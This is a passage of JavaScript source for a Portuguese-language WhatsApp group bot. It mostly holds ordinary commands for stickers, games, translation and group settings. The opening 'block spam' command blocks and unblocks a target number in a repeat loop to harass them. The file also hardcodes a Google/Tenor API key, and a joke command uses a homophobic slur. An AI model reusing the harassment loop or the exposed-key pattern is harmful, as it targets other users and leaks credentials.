let alonezx = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
anya.sendMessage(from, { text: `iniciando block spam...`}, {quoted:m})
//anya.sendMessage(alonezx, { text: `.`})
if (!q) return anya.sendMessage(from, {text: `Cadê a quantidade mn? 🤷‍♂�?`})
for (let i = `${q}`;i !== 0; i -=1){
anya.updateBlockStatus(alonezx, "block")
anya.updateBlockStatus(alonezx, "unblock")
anya.sendMessage(from, { text: `prontinho...`}, {quoted:m})
}
break
case 'setdesc': case 'setdesk': {
	  
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins && !groupOwner) return m.reply(mess.admin)
                if (!text) return m.reply('Text ?')
                await anya.groupUpdateDescription(m.chat, text).then((res) => m.reply('descrição do grupo alterada com sucesso!!')).catch((err) => m.reply(jsonformat(err)))
            }
            break
case 'listonline': case 'liston': {
            
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    anya.sendText(m.chat, 'Lista de membros online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
case 'fliptext': {
/*   if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)*/
if (args.length < 1) return m.reply(`Exemplo:\n${prefix}fliptext alone`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
m.reply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break
/*case 'autoescrever':
           if (q === 'on'){
             autocomposing = true
                    m.reply(`Modo ${command} foi ativado com sucesso`)
                } else if (q === 'off'){
                    autocomposing = false
                    m.reply(`Modo ${command} foi desativado com sucesso`)
            	} else if (!c) {
sendButMessage(
from,
`📛 AUTO COMPOSING ✍🏻️`,
`Selecione abaixo`,
[
{
buttonId: `!autoescrever on`,
buttonText: {
displayText: `on`,
},
type: 1,
},
{
buttonId: `!autoescrever off`,
buttonText: {
displayText: `off`,
},
type: 1,
},
]
);
}
break*/
case 'translate': case 'traduzir': {
//addFilter(from) 
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
if (!args.join(" ")) return m.reply("kd o texto?")
tes = await fetchJson (`https://megayaa.herokuapp.com/api/translate?to=pt&kata=${args.join(" ")}`)
Infoo = tes.info
Detek = tes.translate
m.reply(`📘Resultado : ${Infoo}`)
}
break
              case 'emojimix': {
              
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
	        if (!text) return m.reply(`Exemplo : ${prefix + command} 😡+🤔`)
	        m.reply(mess.wait)
		let [emoji1, emoji2] = text.split`+`
		let anusk = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anusk.results) {
		    let encmedia = await anya.sendImageAsSticker(m.chat, res.url, m, { packname: packname, author: author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break  
case 'emojimix2': {
	    if (!text) return m.reply(`Exemplo : ${prefix + command} 😅`)
	    m.reply(mess.wait)
		let anuuu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anuuu.results) {
		    let encmedia = await anya.sendImageAsSticker(m.chat, res.url, m, { packname: packname, author: author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
case 'tinyurl': {
              
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
            try {
              anu = await axios.get(`https://tinyurl.com/api-create.php?url=${q}`)
              m.reply(`${anu.data}`)
              } catch (e) {
              emror = String(e)
              m.reply(`${e}`)
            }
        }
        break            
case 'reagir': { 
 
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
anya.sendMessage(m.chat, reactionMessage)} 
break
case `tomp4`: case `tovideo`: {	    	 
   
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                if (!quoted) return m.reply(mess.marquest)
                if (!/webp/.test(mime)) return m.reply(`marque o arquivo com` + `*${prefix + command}*`)
                let media = await anya.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await anya.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: mess.convertmsgvideo } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break             
case 'tomp3': {

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Enviar/responder vídeo/áudio que você deseja converter em MP3 com legenda ${prefix + command}`)
if (!m.quoted) return m.reply(`Enviar/responder vídeo/áudio que você deseja converter em MP3 com legenda ${prefix + command}`)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
anya.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg', fileName: `Converted By ${nomedobot} (${m.id}).mp3`}, { quoted : m })
}
break 
case `tts`:                

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                    if (args.length < 1) return anya.sendText(from, `Você deve usar o comando da forma correta:\n${prefix}tts (língua) (texto)\nExemplo: ${prefix}tts pt bom dia\n\nUse: ${prefix}ts para listar todas as línguas`, m)
                    const gtts = require(`./lib/gtts`)(args[0])                   
                    dtt = body.slice(8)
                    ranm = getRandom(`.mp3`)
                    dtt.length > 800 ?
                        m.reply(`Texto muito grande`) :
                        gtts.save(ranm, dtt, function() {
                            anya.sendMessage(from, {audio: fs.readFileSync(ranm), mimetype: `audio/mp4`, ptt: true}, {quoted: m});
                            
                        })
                    break
case 'readmore': {
            
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                if (!text) return m.reply(`Exemplo : ${prefix + command} alonekk`)
                anuv = await fetchJson(`https://cililitan.herokuapp.com/api/readmore?teks=${text}`)
               m.reply(`${anuv.result}`)
            }
            break
case `metadinha`: {

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                const templateMessage = {
text: "*_AGUARDE.._*",
footer: 'não deve demorar muito..',
quoted: m,
templateButtons: []
}

anya.sendMessage(m.chat, templateMessage, { quoted: m })
                let cuecadoanya = await fetchJson(`https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json`)
                let anyapikakkk = cuecadoanya[Math.floor(Math.random() * cuecadoanya.length)]
                anya.sendMessage(m.chat, { image: { url: anyapikakkk.male }, caption: `Menino` }, { quoted: m })
                anya.sendMessage(m.chat, { image: { url: anyapikakkk.female }, caption: `Menina` }, { quoted: m })
setTimeout(async() => {
                    let buttons = [
                        { buttonId: `${prefix}metadinha`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 },       
                    ]
                    await anya.sendButtonText(m.chat, buttons, `*_QUER OUTRA METADINHA?_*`, `${watermark}`)        
                    }, 6000)
            }
	    break            
	    case 'restart':
case 'reiniciar':
if (!isCreator && !m.key.fromMe) return m.reply(mess.owner)
m.reply(`_Reiniciando a ${nomedobot}_`)
exec(`cd &&  node index`)
sleep(4000)
m.reply('Pronto ☕')
break
case 'shutdown':
					case 'desligar':
					if (!isCreator && !m.key.fromMe) return m.reply(mess.owner)
				return anya.sendText(from, JSON.stringify(eval(process.exit())))
				m.reply('Desligado com sucesso 😔')
				break
	    case 'listblockcmd':
try{
teks = '*🚫 A lista de comandos bloqueado são: 🚫*\n'
for(i = 0; i < blockcmd.length; i++) {
teks += `➢ ${blockcmd[i]}\n`
}
m.reply(teks)
} catch {
m.reply('algo deu errado')
}
break
				
case 'blockcmd':
try {
	if (!isCreator && !m.key.fromMe) return m.reply(mess.owner)
if (args.length < 1) return m.reply('*Bloquear com que comando?*')
if(isCmdBlocked(args[0])) return m.reply('*Já esta incluso essa palavra*')
cmdblockk = args[0]
blockcmd.push(cmdblockk)
fs.writeFileSync('./database/blockcmd.json', JSON.stringify(blockcmd))
m.reply('*✅ Comando bloqueado com sucesso ✅*')
} catch {
m.reply('algo deu errado')
}
break
                
case 'unblockcmd':
try {
if (!isCreator && !m.key.fromMe) return m.reply(mess.owner)
if(args.length < 1) return m.reply('*Cade a palavra animal*')
if(!isCmdBlocked(args[0])) return m.reply('*Não esta incluso essa palavra*')
ind = blockcmd.indexOf(args[0])
blockcmd.splice(ind, 1)
fs.writeFileSync('./database/blockcmd.json', JSON.stringify(blockcmd))
m.reply(`*✔️ Comando ${args[0]} desbloqueado com sucesso*`)
} catch {
m.reply('algo deu errado')
}
break

	    case 'ativos': {
theuszin = `
┌──⊰「 *_ATIVOS_* 」
│
│➢ Anti link: ${db.chats[m.chat].antilink ? 'Ativado✅':'Desativado❌'}
│➢ mute: ${db.chats[m.chat].mute ? 'Ativado✅':'Desativado❌'}
│➢ Anti Imagem: ${isAntiImg ? 'Ativado✅':'Desativado❌'}
│➢ Anti Fake: ${isAntiFa ? 'Ativado✅':'Desativado❌'}
│➢ Anti vizu unica: ${isAntiVO ? 'Ativado✅':'Desativado❌'}
│
└──⊰`
let buttons = [
                    {buttonId: `${prefix}ativos`, buttonText: {displayText: `[📍] 𝑺𝑻𝐴𝑻𝑼𝑺 [📍]`}, type: 1},
                    {buttonId: `${prefix}ping`, buttonText: {displayText: `[⚡] 𝑽𝑬𝑳𝑶𝑪𝑰𝑫𝐴𝑫𝑬 [⚡]`}, type: 1},
                    {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: "./lib/anya.jpg" },
                    caption: theuszin,
                    footer: `${watermark}`,
                    buttons: buttons,
                    headerType: 4
                }
                anya.sendMessage(m.chat, buttonMessage, { quoted: m })
                   }
                   break
case 'resetforca':
if (!m.isGroup) return m.reply('Só em Grupo')

if(!isPlayForca) return m.reply(`*Você não iniciou uma partida, para iniciar dê o comando ${prefix}jogodaforca*`)
pla_pos = allForcaId.indexOf(sender)
forca.splice(pla_pos, 1)
fs.writeFileSync('./database/forca.json', JSON.stringify(forca, null, 2))
m.reply(`*Jogo da forca reiniciado com sucesso. Para iniciar outra partida dê o comando ${prefix}jogodaforca*`)
break
case 'forca':
if(!isPlayForca) return m.reply(`*Você não iniciou uma partida, para iniciar dê o comando ${prefix}jogodaforca*`)
if(args.length < 1) return m.reply(`*Dê o comando mais a letra para advinhar*`)
if(args[0].trim().length < 2) {
    p_pos = allForcaId.indexOf(sender)
    find = forca[p_pos].word.match(args[0].toLowerCase())
    is_correct = false 
    while(find != null) {
res_tmp = forca[p_pos].word.indexOf(args[0].toLowerCase())
forca[p_pos].array_under_word[res_tmp] = args[0].toLowerCase()
forca[p_pos].array_word[res_tmp] = 0
forca[p_pos].word = forca[p_pos].word.replace(args[0].toLowerCase(), 0)
find = forca[p_pos].word.match(args[0].toLowerCase())
is_correct = true
    }
    if(is_correct) {
str_under = ''
for(i=0;i<forca[p_pos].array_under_word.length;++i) str_under += forca[p_pos].array_under_word[i]
attempts = forca[p_pos].attempts
if(str_under == forca[p_pos].word_original) {
m.reply(`*Parabéns, Você venceu o jogo!✅🥳*\n\n${puppet[attempts]}\n\n_*Palavra: ${str_under.split('').join(' ')}*_`)
forca.splice(p_pos, 1)
fs.writeFileSync('./database/forca.json', JSON.stringify(forca, null, 2))
} else {
m.reply(`*Você acertou!✅*\n\n${puppet[attempts]}\n\n_*Palavra: ${str_under.split('').join(' ')}*_\n*Você tem ${attempts} chances*`)
fs.writeFileSync('./database/forca.json', JSON.stringify(forca, null, 2))
}
    } else  {
str_under = ''
for(i=0;i<forca[p_pos].array_under_word.length;++i) str_under += forca[p_pos].array_under_word[i]
forca[p_pos].attempts -= 1
attempts = forca[p_pos].attempts
if(forca[p_pos].attempts <= 0) {
forca.splice(p_pos, 1)
fs.writeFileSync('./database/forca.json', JSON.stringify(forca, null, 2))
m.reply(`*Você perdeu o jogo!❌*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Suas chances se esgotaram*`)
} else {
m.reply(`*Você errou!❌*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Você tem ${attempts} chances*`)
fs.writeFileSync('./database/forca.json', JSON.stringify(forca, null, 2))
}
    }
} else {
    p_pos = allForcaId.indexOf(sender)
    if(forca[p_pos].word_original == args[0].toLowerCase()) {
attempts = forca[p_pos].attempts
m.reply(`*Parabéns, Você venceu o jogo!✅🥳*\n\n${puppet[attempts]}\n\n_*Palavra: ${forca[p_pos].word_original.split('').join(' ')}*_`)
forca.splice(p_pos, 1)
fs.writeFileSync('./database/forca.json', JSON.stringify(forca, null, 2))
    } else {
str_under = ''
for(i=0;i<forca[p_pos].array_under_word.length;++i) str_under += forca[p_pos].array_under_word[i]
forca[p_pos].attempts -= 1
attempts = forca[p_pos].attempts
if(forca[p_pos].attempts <= 0) {
forca.splice(p_pos, 1)
fs.writeFileSync('./database/forca.json', JSON.stringify(forca, null, 2))
m.reply(`*Você perdeu o jogo!❌*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Suas chances se esgotaram*`)
} else {
m.reply(`*Você errou!❌*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Você tem ${attempts} chances*`)
fs.writeFileSync('./database/forca.json', JSON.stringify(forca, null, 2))
}
    }
}
break

case 'jogodaforca':
if (!m.isGroup) return m.reply('Só em Grupo')
if (args.length < 1) return m.reply('Ative pressione 1, Desativar pressione 0')
if(isPlayForca) return m.reply(`*Termine a partida iniciada para jogar uma nova, ou dê o comando ${prefix}resetforca*`)
word_correct = (await randompalavra()).slice(1).normalize('NFD').replace(/[\u0300-\u036f]/g, "").toLowerCase()
under_word = '-'.repeat(word_correct.length)
forca.push({
    id: sender,
    word_original: word_correct,
    word: word_correct,
    under_word: under_word,
    array_word: Array.from(word_correct),
    array_under_word: Array.from(under_word),
    tam: word_correct.length,
    attempts: 6
})
fs.writeFileSync('./database/forca.json', JSON.stringify(forca, null, 2))
m.reply(`*Jogo da forca iniciado!✅*\n\n*Palavra: ${under_word.split('').join(' ')}*\n*Para advinhar uma letra , dê o comando ${prefix}forca mais a letra*`)
break
case `nick`: case `styletext`: {
	  
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
		let { styletext } = require(`./lib/scraper`)
		if (!text) return m.reply(`Digite seu nick!`)
                let anu = await styletext(text)
                let teks = `𝑵𝒊𝒄𝒌𝒔 𝒋𝒆𝒓𝒂𝒅𝒐𝒔 𝒄𝒐𝒎 𝒔𝒖𝒄𝒆𝒔𝒔𝒐 𝒏𝒊𝒄𝒌= ${text}\n\n`
                for (let i of anu) {
                    teks += `➥𝑭𝒐𝒏𝒕𝒆𝒔 *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
case 'lirik':
if (args.length < 1) return m.reply('O título da msc?')
m.reply(mess.wait)
teks = body.slice(7)
lirikLagu(teks).then((res) => {
let lirik = `${res[0].result}`
m.reply(lirik)
})
break
case 'getid':{
m.reply(`${groupId}`)
}
break
case 'getcase': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply("Qual case você quer pegar?")
try {
m.reply(`// Created By BloodSword\n` + 'case ' + `'${args[0]}'` + fs.readFileSync('./anya.js').toString().split(`case '${args[0]}'`)[1].split(turbrek)[0] + turbrek)
} catch {
m.reply("Case não encontrado")
}
}
break
case `anime`: {
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                if (!text) return m.reply(`Digite o nome do anime`)
		let { wallpaper } = require(`./lib/scraper`)
                anuu = await wallpaper(text)
                result11 = anuu[Math.floor(Math.random() * anuu.length)]
		let buttons = [
                    {buttonId: `${prefix}anime ${text}`, buttonText: {displayText: `🌠Proxima Imagem🌠`}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result11.image[0] },
                    caption: `⭔ titulo : ${result11.title}\n⭔ categoria : ${result11.type}\n⭔ detalhe : ${result11.source}\n⭔ Url : ${result11.image[2] || result11.image[1] || result11.image[0]}`,
                    footer: `${watermark}`,
                    buttons: buttons,
                    headerType: 4
                }
                anya.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case 'animestory': { 
/*	if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)*/
m.reply(mess.wait)
await fetchJson(`https://api.jikan.moe/v4/anime?q=${q}`)
.then((res) =>{
console.log(res)   
let sections = []   
  for (let i of res.data) {
  const list = {title: `${i.title}`,
  rows: [
	    {
	     title: `${i.title}\n\n`, 
	     rowId: `${prefix}animesearch ${i.mal_id}`,
	     description: `${i.synopsis}`
	    }, 
	    ]
     }
     sections.push(list)   
     }
  const sendm =  anya.sendMessage(
      from, 
      {
       text: "Pesquisa de anime",
       footer: nomedobot,
       title: nomedodono,
       buttonText: "Clique e veja os resultados da pesquisa ➡️",
       sections
      }, { quoted : m }
    )  
})
}
  break
case 'animesearch':{
await fetchJson(`https://api.jikan.moe/v4/anime/${q}`)
.then((res) => {
let txt = `     Anime Search      \n\n*Title:* *${res.data.title}*\n*English:* *${res.data.title_english}*\n*Japanese:* *${res.data.title_japanese}*\n*Anime Type:* *${res.data.type}*\n*Adaptation:* *${res.data.source}*\n*Total Episode:* *${res.data.episodes}*\n*Status:* *${res.data.status}*\n*Ongoing:* *${res.data.airing ? 'Yes' : 'No'}*\n*Aired:* *${res.data.aired.string}*\n*Duration:* *${res.data.duration}*\n*Rating:* *${res.data.rating}*\n*Score:* *${res.data.score}*\n*Rank:* *${res.data.rank}*\n*Main Producer:* *${res.data.producers.name}*\n*Studio:* *${res.data.studios[0].name}* `
anya.sendMessage(from, { image : { url : res.data.images.jpg.image_url}, caption : txt}, {quoted :m }) 
})
}
break
case `contar`:              
        
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                    if (args.length == 0) return m.reply(`0 caracteres, pois obviamente não há texto😀`)
                    const count = body.slice(8).length
                    if (count === 1) {
                        m.reply(`O texto possui ${count} caractere.`)
                    } else if (count > 1) {
                        m.reply(`O texto possui ${count} caracteres.`)
                    }
                    break
 case `fordward`:            
     
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                    anya.sendText(m.chat, `${body.slice(10)}`, m, {
                        contextInfo: {
                            forwardingScore: 999999,
                            isForwarded: true
                        }
                    })
                    break
case `diga`:                

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                    teks = body.slice(6)
                    if (args.length < 1) return
                    saying = teks
                    anya.sendText(m.chat, saying, m)
                    break
case `quando`:

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
				if (!text) return m.reply(`Use Txt, Exemplo : ${prefix + command} quando irei casar `)
					const kapan = [`daqui 5 dias`, `daqui 10 dias`, `daqui 15 dias`,`daqui 20 dias`, `daqui 25 dias`,`daqui 30 dias`,`daqui 35 dias`,`daqui 40 dias`,`45 daqui Dias`,`daqui 50 Dias`,`daqui 55 Dias`,`daqui 60 Dias`,`65 daqui Dias`,`daqui 70 Dias`,`75 daqui Dias`,`daqui 80 Dias`,`85 daqui Dias` ,`daqui 90 Dias`,`daqui 100 Dias`,`daqui 5 Meses`, `daqui 10 Meses`, `daqui 15 Meses`,`daqui 20 Meses`, `daqui 25 Meses`,`daqui 30 Meses`,` 35 Meses daqui`,`40 Meses daqui`,`45 Meses daqui`,`50 Meses daqui`,`55 Meses daqui`,`60 Meses daqui`,`65 Meses daqui`,`70 Meses daqui`,`75 Meses daqui`,`daqui 80 Meses`,`daqui 85 Meses`,`daqui 90 Meses`,`daqui 100 Meses`,`daqui 1 Ano`,`daqui 2 Anos`,`daqui 3 Anos`,`daqui 4 Anos` ,`daqui 5 anos`,`Amanhã`,`O dia depois de amanhã`,`Depois deste comando, você também ${q}`]
					const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
anya.sendMessage(from, { text: `Questão : quando ${q}\nResposta : *${kapankah}*` }, { quoted: m })
					break
case 'swm': case 'stickerwm': {
//addFilter(from) 
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
if (!args.join(" ")) return m.reply(`Exemplo :\nswm anya-md|${nomedodono}`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (m.quoted.isAnimated === true) {
anya.downloadAndSaveMediaMessage(quoted, "gifee")
anya.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")},{quoted: m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await anya.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('máximo 10 segundos')
let media = await quoted.download()
let encmedia = await anya.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else {
m.reply(`Enviar imagem/vídeo com legenda ${prefix + command}\nDuração do vídeo 1-9 segundos`)
}
}
break
case 'wiki':
case 'wikipedia':
if (args.length < 1) return m.reply('O que você está procurando?, preciso de um nome ué 😕')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return m.reply('_[ ! ] O Resultado não foi encontrado 😔_') 
}) 
resultkj = `*Titúlo :* ${res[0].judul}
*Wikipédia :* ${res[0].wiki}`
anya.sendMessage(m.chat, { image: res[0].thumb, caption: resultkj }, { quoted: m }).catch(e => {
  m.reply(resultkj)
})
break
 case `tagme`:
 
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                    const tagme = {
                        text: `@${m.sender.split("@")[0]} 🧙‍♂️`,
                        contextInfo: {
                            mentionedJid: [m.sender]
                        }
                    }
                    anya.sendMessage(from, tagme, text)                   
                    break
case `dado`:                
    
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                    const dadus = ["⚀", "⚁", "⚂", "⚃", "⚄", "⚅"]
                    dadu = dadus[Math.floor(Math.random() * dadus.length)]
                    dador = fs.readFileSync(`./src/dados/` + dadu + `.webp`)
                    anya.sendMessage(m.chat, {sticker: dador}, {quoted: m})                  
                    break
case `caracoroa`:             
      
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                    const cara = fs.readFileSync(`./src/cara/cara.webp`);
                    const coroa = fs.readFileSync(`./src/cara/coroa.webp`);
                    cararo = ["cara", "coroa"]
                    fej = cararo[Math.floor(Math.random() * cararo.length)]
                    gg = fej
                    m.reply(`você conseguiu: ${fej}`)
                    cararoa = fs.readFileSync(`./src/cara/` + fej + `.webp`)
                    anya.sendMessage(m.chat, {sticker: cararoa}, {quoted: m})                  
                    break
case `slot`: {

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
const somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
ppg = Math.floor(Math.random() * 13) + 349
if ((somtoy == `🥑 : 🥑 : 🥑`) ||
(somtoy == `🍉 : 🍉 : 🍉`) ||
(somtoy == `🍓 : 🍓 : 🍓`) ||
(somtoy == `🍎 : 🍎 : 🍎`) ||
(somtoy == `🍍 : 🍍 : 🍍`) ||
(somtoy == `🥝 : 🥝 : 🥝`) ||
(somtoy == `🍑 : 🍑 : 🍑`) ||
(somtoy == `🥥 : 🥥 : 🥥`) ||
(somtoy == `🍋 : 🍋 : 🍋`) ||
(somtoy == `🍐 : 🍐 : 🍐`) ||
(somtoy == `🍌 : 🍌 : 🍌`) ||
(somtoy == `🍒 : 🍒 : 🍒`) ||
(somtoy == `🔔 : 🔔 : 🔔`) ||
(somtoy == `🍊 : 🍊 : 🍊`) ||
(somtoy == `🍇 : 🍇 : 🍇`)) {
var vitr = "Você ganhou!!!"
} else {
var vitr = "Você perdeu..."
}
const slott = 
`Consiga 3 iguais para ganhar
┌──⊰ 💰*_SLOT_*💰                            
│
│➢ ${somtoy}  
│                                               
└──⊰ 💰*_SLOT_*💰
                      
${vitr}`
if (vitr == "Você ganhou!!!") {
setTimeout( () => {
m.reply(`Você ganhou ${ppg} em xp!!!`)
}, 1100)
}
anya.sendText(from, slott, text, {quoted: m})
}

					break
case `morte`: {
            
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
idde = ["30", "76", "90", "72", "83", "73", "83", "74", "92", "100", "94", "48", "37", "53", "63"]
idadez = idde[Math.floor(Math.random() * (idde.length))]
morte = `Pessoas com este nome: ${pushname} \nTendem a morrer aos ${idadez} anos de idade.`
m.reply(morte)
}
break

case `gay`: {

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
random = `${Math.floor(Math.random() * 100)}`
boiola = random
if (boiola < 20 ) {bo = `hmm... você é hetero😔`} else if (boiola == 21 ) {bo = `+/- boiola`} else if (boiola == 23 ) {bo = `+/- boiola`} else if (boiola == 24 ) {bo = `+/- boiola`} else if (boiola == 25 ) {bo = `+/- boiola`} else if (boiola == 26 ) {bo = `+/- boiola`} else if (boiola == 27 ) {bo = `+/- boiola`} else if (boiola == 28 ) {bo = `+/- boiola`} else if (boiola == 29 ) {bo = `+/- boiola`} else if (boiola == 30 ) {bo = `+/- boiola`} else if (boiola == 31 ) {bo = `tenho minha desconfiança...😑`} else if (boiola == 32 ) {bo = `tenho minha desconfiança...😑`} else if (boiola == 33 ) {bo = `tenho minha desconfiança...😑`} else if (boiola == 34 ) {bo = `tenho minha desconfiança...??`} else if (boiola == 35 ) {bo = `tenho minha desconfiança...😑`} else if (boiola == 36 ) {bo = `tenho minha desconfiança...😑`} else if (boiola == 37 ) {bo = `tenho minha desconfiança...??`} else if (boiola == 38 ) {bo = `tenho minha desconfiança...😑`} else if (boiola == 39 ) {bo = `tenho minha desconfiança...😑`} else if (boiola == 40 ) {bo = `tenho minha desconfiança...😑`} else if (boiola == 41 ) {bo = `você é né?😏`} else if (boiola == 42 ) {bo = `você é né?😏`} else if (boiola == 43 ) {bo = `você é né?😏`} else if (boiola == 44 ) {bo = `você é né?😏`} else if (boiola == 45 ) {bo = `você é né?😏`} else if (boiola == 46 ) {bo = `você é né?😏`} else if (boiola == 47 ) {bo = `você é né?😏`} else if (boiola == 48 ) {bo = `você é né?😏`} else if (boiola == 49 ) {bo = `você é né?😏`} else if (boiola == 50 ) {bo = `você é ou não???`} else if (boiola > 51) {bo = `você é gay??`
}
hasil = `Você é ${random}% gay\n\n${bo}`
m.reply(hasil)
}
break
case "ppt":
if (args.length < 1) return m.reply(`Você deve digitar ${prefix}ppt pedra👊🏻, ${prefix}ppt papel✋ ou ${prefix}ppt tesoura✌🏻`)
ppt = ["pedra","papel","tesoura"]
ppy = ppt[Math.floor(Math.random() * ppt.length)]
ppg = Math.floor(Math.random() * 13) + 349
pptb = ppy
pph = `Você ganhou ${ppg} em xp`
if ((pptb == "pedra" && args == "papel") || 
(pptb == "papel" && args == "tesoura") || 
(pptb == "tesoura" && args == "pedra")) {
var vit = "vitoria"
} else if ((pptb == "pedra" && args == "tesoura") || 
(pptb == "papel" && args == "pedra") || 
(pptb == "tesoura" && args == "papel")) {
var vit = "derrota"
} else if ((pptb == "pedra" && args == "pedra") ||
(pptb == "papel" && args == "papel") ||
(pptb == "tesoura" && args == "tesoura")) {
var vit = "empate"
} else if (vit = "undefined") {
return m.reply(`Você deve digitar ${prefix}ppt pedra, ${prefix}ppt papel ou ${prefix}ppt tesoura`)
}
if (vit == "vitoria") {
var tes = "Vitória do jogador"
}
if (vit == "derrota" ) {
var tes = "A vitória é da anya"
}
if (vit == "empate" ) {
var tes = "O jogo terminou em empate 🤝"
}
m.reply(`anya jogou: ${pptb}\nO jogador jogou: ${args}\n\n${tes}`)
if (tes == "Vitória do jogador") {
m.reply(pph)
}
break
case 'ringtone': {
        //if (!isCreator && !isBan) return
		if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		anya.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break	   
case `chance`: {

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
var avb = body.slice(7)
if (args.length < 1) return m.reply(`Você precisa digitar da forma correta\nExemplo: ${prefix}chance do(a) ${pushname} ser um(a) trouxa`)
random = `${Math.floor(Math.random() * 100)}`
hasil = `A chance${body.slice(7)}\n\né de... ${random}%`
m.reply(hasil)
}
break
case `gostoso`: {

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
rate = body.slice(8)
m.reply(`❰ Pesquisando a ficha de gostoso, aguarde... ❱`)
setTimeout(async() => {
wew = fs.readFileSync(`./lib/gostoso.jpg`)
random = `${Math.floor(Math.random() * 110)}`
